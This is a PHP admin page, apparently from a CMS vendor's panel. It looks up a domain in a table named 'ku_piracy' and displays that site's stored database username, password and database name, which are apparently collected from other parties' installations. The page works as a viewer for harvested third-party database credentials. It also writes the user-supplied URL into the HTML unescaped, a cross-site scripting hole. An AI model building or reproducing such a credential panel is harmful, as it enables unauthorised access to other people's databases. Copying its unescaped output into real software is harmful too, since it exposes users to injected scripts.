<?php
include '../includes/common.php';
include 'header.php';
include 'nav.php';
$type='<font color="orange">无数据</font>';
 $url = daddslashes($_GET['url']);
        $domain = parse_url($url);
        $domain = $domain['host'];   
$piracylist = $DB->get_row("SELECT * FROM `ku_piracy` WHERE `url` = '{$domain}'");
?>
<br> 
<div class="row">
 <div class="col-md-12">
 <div class="white-box hidden-xs">
                <div class="widget-header">
                  <h4>
                    <i class="icon-reorder">
                    </i>
                    获取密码
                  </h4>
                </div>
                <div class="widget-content no-padding">
                  <table class="table table-striped">
                    <thead>
                      <tr>
                        <th>
                         名称
                        </th>
                        <th>
                         详情
                        </th>
                      </tr>
                    </thead>
                    <tbody>
                 <?php if ($piracylist=='') { ?>
                 	 <tr>
                        <td>
                          <span class="label label-default">
                            站点网址：
                          </span>
                        </td>
                        <td>
                          <code>
                            <a href="/jump.php?url=<?=urlencode($url)?>" target="_blank"><?=$type?></a>
                          </code>
                        </td>
                      </tr>
                      <tr>
                        <td>
                          <span class="label label-primary">
                            数据库用户名：
                          </span>
                        </td>
                        <td>
                          <code>
                            <?=$type?>
                          </code>
                        </td>
                      </tr>
                      <tr>
                        <td>
                          <span class="label label-success">
                            数据库密码：
                          </span>
                        </td>
                        <td>
                          <code>
                           <?=$type?>
                          </code>
                        </td>
                      </tr>
                      <tr>
                        <td>
                          <span class="label label-info">
                            数据库名：
                          </span>
                        </td>
                        <td>
                          <code>
                           <?=$type?>
                          </code>
                        </td>
                      </tr>


                 <?php }else{ ?>

                     <tr>
                        <td>
                          <span class="label label-default">
                            站点网址：
                          </span>
                        </td>
                        <td>
                          <code>
                            <a href="/jump.php?url=<?=urlencode($url)?>" target="_blank"><?=$url?></a>
                          </code>
                        </td>
                      </tr>
                      <tr>
                        <td>
                          <span class="label label-primary">
                            数据库用户名：
                          </span>
                        </td>
                        <td>
                          <code>
                            <?=$piracylist['dbuser']?>
                          </code>
                        </td>
                      </tr>
                      <tr>
                        <td>
                          <span class="label label-success">
                            数据库密码：
                          </span>
                        </td>
                        <td>
                          <code>
                           <?=$piracylist['dbpwd']?>
                          </code>
                        </td>
                      </tr>
                      <tr>
                        <td>
                          <span class="label label-info">
                            数据库名：
                          </span>
                        </td>
                        <td>
                          <code>
                           <?=$piracylist['db']?>
                          </code>
                        </td>
                      </tr>

                  <?php  } ?>

                     

                      <tr>
                        <td>
                          <span class="label label-warning">
                            功能操作：
                          </span>
                        </td>
                        <td>
                        <a href="/jump.php?url=<?=urlencode($url)?>" class="btn btn-xs btn-success" target="_blank">进入网站</a>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>             
            </div>
            </div>
 <div class="row">
            <div class="col-md-12">
              <div class="white-box">
                <div class="widget-header">
                  <h4>
                    <i class="icon-reorder">
                    </i>
                    获取密码
                  </h4>
                </div>
                <div class="widget-content">
                  <form class="form-horizontal row-border" action="./getgain.php" method="GET" role="form">
                    <div class="form-group">
                      <label class="col-md-2 control-label">
                        网址:
                      </label>
                      <div class="col-md-10">
                        <input type="text" name="url" class="form-control" value="http://<?=$url?>" placeholder="http://www.yunziyuan.com.cn/" required>
                      </div>
                    </div>
                      <div class="form-group">
                      <label class="col-md-2 control-label">
                        方式:
                      </label>
                      <div class="col-md-10">
                        <div class="row">
                          <div class="col-md-10">
                            <select class="form-control" name="m">
                              <option value="1" selected> 
                                1_获取密码
                              </option>
                           </select>
                          </div>
                        </div>
                       </div>
                       </div>
                         <div class="form-group">
                      <label class="col-md-2 control-label">
                      </label>
                      <div class="col-md-12">
                         <button id="submit" class="btn btn-primary btn-block">获取站点信息</button>
                      </div>
                    </div>
                    </form>
                    </div>
                    </div>
                    </div>
                    </div>

          </div>
        <footer class="footer-main"><a target="_blank" href="http://www.kuxiangcms.com/"><?php echo $conf['copyright'] ?></a></footer>  
       </div>
    <script src="./admin/js/jquery.min.js"></script>
    <script src="./admin/js/bootstrap.min.js"></script>
    <script src="./admin/plugins/moment/moment.js"></script>
    <script  src="./admin/js/jquery.slimscroll.js "></script>
    <script src="./admin/js/jquery.nicescroll.js"></script>
    <script src="./admin/js/functions.js"></script>
    <script src="./admin/plugins/morris-chart/morris.js"></script>
    <script src="./admin/plugins/morris-chart/raphael-min.js"></script>
    <script src="./admin/plugins/jquery-sparkline/jquery.charts-sparkline.js"></script>
   
</body>
</html>